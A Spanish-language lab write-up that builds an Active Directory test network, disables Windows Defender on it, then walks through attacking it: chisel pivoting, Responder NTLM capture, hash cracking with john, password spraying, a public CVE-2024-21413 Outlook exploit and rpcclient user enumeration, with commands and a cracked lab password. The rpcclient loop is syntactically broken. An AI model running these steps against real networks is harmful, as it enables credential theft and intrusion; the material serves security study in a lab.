Primero vamos a preparar el entorno de Active directory, para ello empezaremos con un Windows Server Datacenter que tendrá el rol de Domain Controller dentro del Active Directory, seguido de las 3 máquinas win 10 que harán de clientes de este servidor. El Windows Server aparte de tener el rol de DC, también ofrecerá otros servicios como:

+	Correo
+	Servidor DHCP
+	Servidor DNS

Así que después de haber enumerado todos los servicios que ofrecerá, toca crear la máquina. 

## Crear máquinas (DC):

En este caso utilizaremos un Windows Server 2016, pero la versión Datacenter. Y en nuestro caso le pondremos el nombre de máquina DC-Companny.
+ Le Ponemos 4gb de RAM, 2 núcleos y habilitamos el modo EFI.
+ De disco, ponemos el espacio correspondiente (en nuestro caso 400gb).

Una vez tenemos esto, ya podemos iniciar la máquina virtual (si vamos a poner la MV en una red NAT o vamos a modificar la interfaz de red, antes de inicarla, modificarlo). Procedemos con la instalación normal, Al escoger la versión, debemos escoger la “Windows Server 2016 Datacenter Evaluation (Desktop Experience)”.

![Imagen1](https://github.com/Vicctoriaa/VISMA/assets/153718557/f14d5c9a-b3a1-46be-9efe-731832da937f)

Una vez Instalado, nos pedirá poner una contraseña de administrador para la Máquina, se la indicamos y acabará de iniciar. Una vez acabe de iniciar, nos logueamos y nos aparecerá lo siguiente:

![Imagen2](https://github.com/Vicctoriaa/VISMA/assets/153718557/eeb2f9da-7db9-45f9-af32-d21aa1e04daa)

## Instalando servicios:

Para poder instalar los servicios que necesitamos lo que haremos sera dirigirnos a manage > add roles and Features y desde ahí podremos instalar lo que necesitamos que en nuestro caso serian 3 servicos necesarios, active directory, dns y dhcp.
Solamente hemos de seleccionarlo en el apartado server roles, tal y como se muestra en la imagen.

![Imagen3](https://github.com/Vicctoriaa/VISMA/assets/153718557/4807130e-5fc4-42c1-a545-f9359b4bcdaf)

Aceptaremos todo y en el apartado de confirmación, confirmaremos pulsando “install”para así se instale lo escogido anteriormente.
Una vez instalado nos saldrá de esta manera, ya podremos cerrarlo.

Arriba a la derecha habrá una bandera el cual son las notificaciones, pulsaremos en ella y nos deberá salir un apartado el cual será el active directory, si pulsamos en él, nos llevará a la siguiente pestaña (lo que se muestra en imagen), crearemos nuestro propio dominio con el nombre que queramos.

![Imagen4](https://github.com/Vicctoriaa/VISMA/assets/153718557/72127c28-d569-4ba2-ad77-8c599e10cc41)

Seguido nos pedirá una constraseña para nuestro dominio, tendremos que tener activado (en la misma pestaña) "Domain Name System (DNS) server" y "Global Catalog (GC)". En el apartado opción adicional, le pondremos el nombre de nuestro proyecto. 
Una vez aceptemos todo nos pedirá reiniciar la máquina, la reiniciamos.


## Change Hostname: 

Para cambiar el nombre pc haremos click derecho en el símbolo de Windows de nuestra barra de tareas y nos dirigiremos a "System".
Nos saldrá una ventana con datos del sistema, deberemos darle a "Change settings".

![Imagen5](https://github.com/Vicctoriaa/VISMA/assets/153718557/ff524d02-dc1e-42c7-aa53-11f15baf89b3)

Nos saltara otra ventana el cual para poder cambiarle el nombre deberemos pulsar en "Change", escribiremos el nombre que queramos ponerle a nuestro pc, cuando aceptemos nos pedirá reiniciar para que se pueda cambiar correctamente, no es obligatorio reiniciar pero seria conveniente.

## Creación de usuarios AD:

Comenzaremos a crear los usuarios del active directory, para ello iremos a Tools > Active directory Users and Computers, nos saldrá una ventana tal y como se muestra en la imagen el cual haremos click derecho > users > new y crearemos los usuarios que necesitemos, con una contraseña sergura. Nosotros hemos creado el usuario de Ismail y Victoria como usuarios sin privilegios. 

![Imagen6](https://github.com/Vicctoriaa/VISMA/assets/153718557/7cae5d92-0d95-4080-b22e-7cd707a257c2)

Una hayamos creado los usuarios necesarios en nuestro active directory, pasaremos al siguiente paso.

## Configuración del DHCP:

Para configurar el DHCP será importante tenerlo instalado como comentamos en el primer punto. Comenzaremos yendo a la bandera veremos la notificación del DHCP, cuando le demos a "complete DHCP configuration" se nos abrira una ventana, en autorizacion pondremos el nombre que queramos,en nuestro caso pusimos VISMA\Administrator, aceptamos y instalamos. 

![Imagen7](https://github.com/Vicctoriaa/VISMA/assets/153718557/396c0986-f835-45b3-809c-3b15b961b9f5)

Seguido iremos a tolos > DHCP, entraremos abriremos las carpetas hasta entrar a iPv4, añadiremos una nueva ip comenzando por la ip 192.168.1.40 hasta la 192.168.1.200, con la máscara 255.255.255.0 pondremos 90 días, como router pondremos la ip 192.168.1.1 como name Domain pondremos el que pusimos al crear nuestro dominio visma.local  
 
![Imagen8](https://github.com/Vicctoriaa/VISMA/assets/153718557/5da1339a-0eac-4d1f-acee-d647b3c23dd4)

## Installing hmailserver:

Para que todo vaya correctamente deberemos instalar una característica llamada ".NET Framework 3.5".

![Imagen9](https://github.com/Vicctoriaa/VISMA/assets/153718557/95aed4f6-5ff2-4430-8f36-7c2ff5be02df)

Una vez este instalada, iremos a nuestro navegador y instalaremos el hmailserver (url), cuando ya lo hayamos instalado, lo iniciaremos, nos pedirá una contraseña pondremos la que nosotros queramos , una vez dentro añadiremos un dominio, pondremos el dominio que creamos anteriormente en nuestro AD, pondremos usuarios lo que creamos anteriormente yendo a nuestro dominio Accounts > Add, pondremos el nombre que queramos pero es recomendable poner el de los usuarios que creamos en nuestro AD.

![Imagen10](https://github.com/Vicctoriaa/VISMA/assets/153718557/451d6269-360f-4c71-bc3a-75f783716346)

## Creando y configurando los clientes del AD DC:

Empezaremos creando las máquinas de cada usuario, omitimos la instalación desatendida para poder escoger la versión de Windows, ya que para poder ser clientes del AD, debemos contar con la versión profesional de Windows (Windows pro). La instalamos con las carateristicas que queramos, en nuestro caso al tener un ordenador estable le pusimos las siguientes características:

![Imagen11](https://github.com/Vicctoriaa/VISMA/assets/153718557/51369ba7-0917-45a0-95fb-05df81c6502c)

Una vez tengamos la máquina la clonaremos identicamente para asi poder hacer la máquina del otro usuario. Una vez cloanda comenzaremos a instalarla, en nuestro caso le hemos puesto al nombre de equipo LocalAdmin, cuando acabemos de instalarla. Iniciar la terminal/cmd, pondremos ipconfig (comando el cual nos sirve para saber que ip tiene ) encontraremos que los 2 tienen la misma ip, si revisamos los dispositivos a los cuales el Windows server ha dado ip, solo nos aparece 1:

![Imagen12](https://github.com/Vicctoriaa/VISMA/assets/153718557/cd44ee9b-da67-41b0-bf3d-dcdafd760b02)

En lo que nos deberíamos fijar es en el “Unique ID”, este es la dirección MAC y es que al clonar las máquinas también se ha clonado la dirección MAC. Por lo que, para resolver este problema, simplemente debemos Apagar una máquina, entrar en configuración > red > Avanzado. Y aquí pedir otra MAC. Y ya está, se han cambiado solo las últimas 3 duplas de la dirección MAC, ya que las 3 primeras, hacen referencia al fabricante (Virtual box).
Una vez tenemos esto, ya podemos inicar la máquina y ver que tenemos una dirección ip distinta y además nos aparece en “Adresses Leases” en el Win Server.

![Imagen13](https://github.com/Vicctoriaa/VISMA/assets/153718557/3e8b3313-bfa7-4d5c-933c-3aad8fc88dd0)

## Añadir ordenadores al AD:

Para añadir ordenadores al AD, es decir, añadirles nuestro ddominio, deberemos dirijirnos a la confirguación de nuestra máquina, dentro de cuentas > Obtener acceso a trabajo o escuela, seleccionaremos conectar como nosotros no tendremos que poner un correo eléctronico sino un dominio, le daremos abajo, donde dice "UNir este dispositivo a un dominio local AD", pondremos nuestro dominio visma.local.

![Imagen14](https://github.com/Vicctoriaa/VISMA/assets/153718557/7cb03d7e-24f9-4252-b0a3-67814f73ad61)

Pondremos el usuario que queramos poner en ese ordenador, es decir, si estamos poniendo el dominio en la máquina Isma, pondremos le usuario ismail, seguido el tipo de cuenta la dejaremos con administrador, y reiniciaremos, lo mismo haremos en con la otra máquina, Victoria.

![Imagen15](https://github.com/Vicctoriaa/VISMA/assets/153718557/5bdd1897-1534-40ba-bea3-12a9f4cde8f1)

Lo siguiente será quitar el antivirus de nuestras máquinas. Para quitar el de nyestro serividor abriremos la PowerShell y pondremos el siguiente comando:

```
Uninstall-WindowsFeature -Name Windows-Defender
```

![Imagen16](https://github.com/Vicctoriaa/VISMA/assets/153718557/ca11180b-26f9-40da-9eba-9883763a192f)

Para quitar el antivirus de nuestras máquinas usuarios nos dirigiremos a configuración > Actualización y seguridad > Seguridad win > Protección contra virus y amenazas > Admin de la configuración, lo desactivamos todo. Luego seguido para confirmarlo haremos win + r ponemos gpdit.msc, nos dirigimos a la carpeta, plantilla admin > antivirus win defender > veremos si esta desactivado al completo, en caso de que no lo desactivamos manualmente.

![Imagen17](https://github.com/Vicctoriaa/VISMA/assets/153718557/644d3cad-6c42-49c4-8546-7ffe1e1d38ae)

## Hackeo mediante Aragog:

Para comenzar el hackeo desde la Aragog, hemos tenido que hackearla como se muestra en el documento `aragog`, una vez ya estemos conectados a la aragog, en nuestra máquina prinicpal podremos comenzar a hackear. Utilizaremos la herramienta chisel, la instalaremos en github, una vez instalado como esat en zip, tendremos que extraerlo así que lo haremos con comandos, dentro del directorio que tengamos la instalación lo extraeremos con el comando `gzip -d (instalación)`, seguido moveremos el archivo de la instalación a nuestra carpeta chisel, le daremos permisos a chisel, con el comando `chmod +x chisel`.
Creamos un archivo temporal con `mktemp -d`.
si entramos al directorio veremos que esta el chisel, seguido crearemos un servidor con el siguiente comando:

```
./chisel server -reverse -p 1234
```
Seguido crearemos también el servidor del cliente:

```

./chisel client 192.168.1.111:1234 R:socks
```
añadiremos el servidor en el archivo proxychain4.conf, con el comando `nano /etc/proxychain4.conf`. Si nos fijamos en la ip con el comando `hostname -I` o con `ip a` podremos encontrar dos interfaces red. La siguiete imagen podemos ver un diagrama de la red actual.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/1ed3ae3f-a751-456e-acc2-9b053d573269)

Mediante crackmapexec añadiéndole el parámetro ‘smb’ y el segmento de ip, podemos hacer una búsqueda por smb a dispositivos.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/d19d7f88-9746-45b1-a15d-8c17baecc18b)

Una vez encontramos todos los dispositivos, le añadiremos el parámetro “—relay-gen-list” con el nombre “relay.list”, esto hará que todas las ip que encuentre las meterá a un archivo relay.list. Esto nos servirá mas adelante para el ntlmrelay. No podemos usar el responder con proxychains, ya que este requiere estar conectado a la red donde se encuentra el smb directamente.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/189168ee-3ac7-4446-acac-5f552a96be0e)

Pasamos el responder por scp a la maquina aragog

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/a00ecfaa-5340-4f52-a9bc-5052135b5abe)

Lo que deberemos hacer sera descomprimirlo con el comando `tar xvf responder.tar.gz`, entraremos al directorio con el comando `cd (diretorio)`una vez descomprimido. Ejecutamos el responder con los parámetros -wd y como la máquina ISMA-PC tiene una tarea programada, para acceder a un recurso compartido en red llamado \\MYSQLServer , pero este no esta disponible. 
Ejecutamos el responder con los parámetros -wd y como la máquina ISMA-PC tiene una tarea programada, para acceder a un recurso compartido en red llamado \\MYSQLServer , pero este no esta disponible.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/c09439a7-1f97-450c-b0a2-6deada7ba2ee)

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/eb1d34c0-f750-4c10-9096-0b29195702a4)

Como el recurso no está disponible, el script “responde” al DC diciédole que es el, el recurso compartido, de esta manera que el cliente acaba autenticándose contra nosotros y así recibiendo su hash NTLM. Copiamos el hash, lo metemos dentro de un archivo y junto a john, le añadimos el parámetro “—wordlist=’’”, le damos acceso a un diccionario que por fuerza ruta nos ayudará a romperlo y finalmente encontrar que la contraseña es “baseball1?”, tal y como podemos observar en la siguiente imagen:

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ea2f2611-d2f1-4e86-b186-ff4846a0898d)

Una vez tenemos la contraseña, con la ayuda de `crackmapexec` ejecutamos un `passwordspraying`, encontramos que el usuario es válido para login y adémas somos administrador en el equipo ‘192.168.2.41’.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/67da87e6-d6fe-4bdb-be7f-5c1d2cc76bc6)

Hacemos un escaneo de puertos con nmap sobre el DC y encontramos que tiene el puerto 110 y el 587 (correo) abiertos, por lo que intentaremos enviar un correo, para ello nos aprovecharemos de una vulnerabilidad con Outlook: 

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/465f515f-f647-4a16-a40e-20a94bc97adb)

Por lo que buscamos el POC (Proof of concept) que se encuentra en este github, `https://github.com/duy-31/CVE-2024-21413`, por lo que hacemos un `git clone https://github.com/duy-31/CVE-2024-21413` para copiar el repositorio a nuestro directorio actual de trabajo.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/54988445-9023-4d23-817d-18643ac0a10a)

Abrimos el .sh y modificamos el html, con el comando `sudo nano cve-2024-21413.sh` para asi se muestre lo que nosotros queremos que se vea.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/a82a42a7-4f34-4c92-8c80-0b733472fb77)

Lo ejecutamos y vemos que nos pide iniciar sesión, por lo que vamos a probar con las credenciales que ya tenemos, para ello debemos convertir tanto como el usuario como la contraseña en base64 (aunque lo podemos hacer por consola, en este caso usarémos la herramienta cyberchef ya que es mas visual).

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/74e68204-ef05-4b15-bd9f-7971f6dec8c1)

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/bfaef261-2c2f-4bde-987b-4cd200395c34)

Una vez lo tenemos modificamos el código de que pueda loguearse

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/8bb7b08e-c79b-4782-87ef-023fdca9d9a8)

Después de haber modificado el código no funciona, por lo que usaremos el código de base para hacerlo a mano, por lo que nos conectamos con proxychains por telnet a la ip del DC.

```
proxychains telnet 192.168.2.253 25
```

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/dd95b14f-803c-4c4e-a310-9d814a4f3a86)

Dejamos la terminal del responder abierta y una vez se nos abra por completo conseguimos el hash NTLMv2 de vcondeperez.

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/34ac560d-d464-43b8-b947-031d4736a4f3)

Aquí se puede observar como se vería el correo de la víctima:

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/71a12d03-67d4-4cff-98f0-e2871c41e60d)

De lo que se trata esta vulnerabilidad es básicamente que Outlook no te pregunta si quieres abrir el enlace, ya que por ejemplo `thunderbird` si que te pregunta antes de abrirlo. Se vería así al abrirlo:

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/d8164767-3871-4ba3-9c51-661a0827efa4)

Crackeamos la contraseña.

```
john --show hashes
```

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/42d08dfe-7a7a-4b3e-82b2-06ee989b12b7)

 Enumeramos los users y encontramos uno que se llama test, enumeramos su información.  

![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/a53ef6b9-b78a-4939-90ef-873e54f3c13e)

El usuario test pertenece al grupo con rid 0x201, si nos ponemos a enumerar todos los datos de los usuarios por rid, encontramos que el usuario “administrator” pertenece también al grupo con rid 0x201 por lo que nos da a entender que el usuario test es un usuario administrador.

```
for rid in $(proxychains rpcclient -U '(dominio)\(usuario)%contraseña' 192.168.2.253 -c 'endomusers' 2>/dev/null | grep -oP '\[.*?\]* | grep '0x' | tr -d '[]'); do echo -e "\n[+] para el Rid $rid\n"; proxychains rpcclient -U (dominio)\(usuario)%contraseña' 192.168.2.253 -c 'queryuser' $rid" 2>/dev/null ;donde | grep -vE 'Home|Dir|Profile|Logon|Workstations|Comment|remote|off|Password|padding|logon|bad|fields
```
En nuestro caso en dominio hemos puesto `visma.local`, en usuario `iabjijalazhari` y en contraseá la que nos dio anteriormente `baseball1?` tal que quedaria asi: `'vimsa.local\iabjijalazhari%baseball1?'`



